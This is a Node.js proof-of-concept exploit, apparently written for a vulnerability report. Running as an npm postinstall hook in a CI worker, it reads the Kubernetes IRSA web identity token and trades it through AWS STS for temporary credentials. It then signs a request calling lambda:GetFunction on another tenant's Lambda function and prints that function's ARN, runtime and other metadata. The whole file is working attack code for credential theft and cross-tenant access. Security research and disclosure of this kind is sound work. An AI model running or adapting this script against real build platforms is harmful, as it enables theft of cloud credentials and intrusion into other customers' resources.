const fs = require('fs');
const https = require('https');
const crypto = require('crypto');

function b64urlDecode(s) {
  return Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
}

function awsSign(method, service, action, payload, creds, region) {
  const host = `${service}.${region}.amazonaws.com`;
  const datetime = new Date().toISOString().replace(/[:-]/g, '').replace(/\.\d+Z/, 'Z');
  const date = datetime.slice(0, 8);

  const hash = crypto.createHash('sha256');
  hash.update(payload || '');
  const payloadHash = hash.digest('hex');

  const canonicalRequest = [
    method,
    '/',
    '',
    `content-type:application/x-amz-json-1.1\nhost:${host}\nx-amz-date:${datetime}\nx-amz-security-token:${creds.sessionToken}`,
    '',
    'content-type;host;x-amz-date;x-amz-security-token',
    payloadHash,
  ].join('\n');

  const canonicalHash = crypto.createHash('sha256').update(canonicalRequest).digest('hex');
  const credScope = `${date}/${region}/${service}/aws4_request`;
  const stringToSign = `AWS4-HMAC-SHA256\n${datetime}\n${credScope}\n${canonicalHash}`;

  const kDate = crypto.createHmac('sha256', 'AWS4' + creds.secretAccessKey).update(date).digest();
  const kRegion = crypto.createHmac('sha256', kDate).update(region).digest();
  const kService = crypto.createHmac('sha256', kRegion).update(service).digest();
  const kSigning = crypto.createHmac('sha256', kService).update('aws4_request').digest();
  const signature = crypto.createHmac('sha256', kSigning).update(stringToSign).digest('hex');

  return {
    Authorization: `AWS4-HMAC-SHA256 Credential=${creds.accessKeyId}/${credScope}, SignedHeaders=content-type;host;x-amz-date;x-amz-security-token, Signature=${signature}`,
    'X-Amz-Date': datetime,
    'X-Amz-Security-Token': creds.sessionToken,
  };
}

console.log('=== POC: postinstall RCE + cross-tenant lambda:GetFunction ===\n');
console.log('1. Extracting IRSA identity...');
console.log('   AWS_ROLE_ARN =', process.env.AWS_ROLE_ARN);
console.log('   AWS_WEB_IDENTITY_TOKEN_FILE =', process.env.AWS_WEB_IDENTITY_TOKEN_FILE);

const tokenPath = process.env.AWS_WEB_IDENTITY_TOKEN_FILE;
if (!tokenPath || !fs.existsSync(tokenPath)) {
  console.log('   ERROR: No IRSA token file found\n');
  process.exit(1);
}

const token = fs.readFileSync(tokenPath, 'utf8').trim();
const payload = JSON.parse(b64urlDecode(token.split('.')[1]));
console.log('   ✓ Token subject:', payload.sub);
console.log('   ✓ Token audience:', payload.aud);

// Step 1: AssumeRoleWithWebIdentity to get temp credentials
console.log('\n2. Assuming cd-tekton-worker role via STS...');
const roleArn = process.env.AWS_ROLE_ARN;
const region = process.env.AWS_REGION || 'eu-central-1';
const stsParams = new URLSearchParams({
  Action: 'AssumeRoleWithWebIdentity',
  Version: '2011-06-15',
  RoleArn: roleArn,
  RoleSessionName: 'poc-session',
  WebIdentityToken: token,
}).toString();

https.get(`https://sts.${region}.amazonaws.com/?${stsParams}`, res => {
  let body = '';
  res.on('data', c => body += c);
  res.on('end', () => {
    try {
      const xml = body;
      const accessKeyMatch = xml.match(/<AccessKeyId>([^<]+)<\/AccessKeyId>/);
      const secretKeyMatch = xml.match(/<SecretAccessKey>([^<]+)<\/SecretAccessKey>/);
      const sessionTokenMatch = xml.match(/<SessionToken>([^<]+)<\/SessionToken>/);

      if (!accessKeyMatch || !secretKeyMatch || !sessionTokenMatch) {
        console.log('   ERROR: Failed to extract credentials from STS response');
        process.exit(1);
      }

      const creds = {
        accessKeyId: accessKeyMatch[1],
        secretAccessKey: secretKeyMatch[1],
        sessionToken: sessionTokenMatch[1],
      };
      console.log('   ✓ Got temporary credentials (AccessKeyId:', creds.accessKeyId.slice(0, 12) + '...)');

      // Step 2: Use those credentials to call lambda:GetFunction on PROJECT B's function
      console.log('\n3. Calling lambda:GetFunction on Project B\'s function (cross-tenant read)...');

      // Project B subdomain: ffvuxtepyautytovdlnf
      // Function path: functions/hello.js
      // Function name = sha256(ffvuxtepyautytovdlnf + functions/hello.js)
      const projectBFunctionName = '423b2e9c64cc5ce6bbe1286baca4c10348cd4e71cde1339da07ad0869585e4d8';
      console.log('   Target function:', projectBFunctionName);
      console.log('   Target region:', region);

      const lambdaHost = `lambda.${region}.amazonaws.com`;
      const lambdaPath = `/2015-03-31/functions/${projectBFunctionName}`;

      const authHeaders = awsSign('GET', 'lambda', 'GetFunction', '', creds, region);

      const lambdaOptions = {
        hostname: lambdaHost,
        path: lambdaPath,
        method: 'GET',
        headers: {
          'Content-Type': 'application/x-amz-json-1.1',
          ...authHeaders,
        },
      };

      https.get(lambdaOptions, lambdaRes => {
        let lambdaBody = '';
        lambdaRes.on('data', c => lambdaBody += c);
        lambdaRes.on('end', () => {
          if (lambdaRes.statusCode === 200) {
            console.log('   ✓ SUCCESS: Got Project B\'s function metadata (status', lambdaRes.statusCode + ')');
            const fnData = JSON.parse(lambdaBody);
            console.log('   Function ARN:', fnData.Configuration?.FunctionArn);
            console.log('   Function name:', fnData.Configuration?.FunctionName);
            console.log('   Runtime:', fnData.Configuration?.Runtime);
            console.log('   Last modified:', fnData.Configuration?.LastModified);
          } else {
            console.log('   HTTP', lambdaRes.statusCode, ':', lambdaBody.slice(0, 200));
          }
        });
      }).on('error', e => console.log('   ERROR: Lambda call failed:', e.message));

    } catch (e) {
      console.log('   ERROR:', e.message);
      process.exit(1);
    }
  });
}).on('error', e => {
  console.log('   ERROR: STS call failed:', e.message);
  process.exit(1);
});
